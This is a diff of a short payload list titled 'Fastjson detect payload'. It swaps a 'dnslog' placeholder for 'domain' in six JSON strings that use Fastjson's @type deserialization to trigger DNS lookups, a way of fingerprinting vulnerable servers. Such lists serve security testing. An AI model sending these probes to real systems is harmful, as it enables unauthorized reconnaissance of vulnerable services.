@@ -1,8 +1,8 @@
 # Fastjson detect payload
 
-{"test":{"@type":"java.net.URL","val":"dnslog"}}
-{"test":{"@type":"java.net.InetAddress","val":"dnslog"}}
-{"test":{"@type":"java.net.Inet4Address","val":"dnslog"}}
-{"test":{"@type":"java.net.Inet6Address","val":"dnslog"}}
-{"test":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
-{"test":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
+{"test":{"@type":"java.net.URL","val":"domain"}}
+{"test":{"@type":"java.net.InetAddress","val":"domain"}}
+{"test":{"@type":"java.net.Inet4Address","val":"domain"}}
+{"test":{"@type":"java.net.Inet6Address","val":"domain"}}
+{"test":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"domain"}}""}
+{"test":{"@type":"java.net.InetSocketAddress"{"address":,"val":"domain"}}}
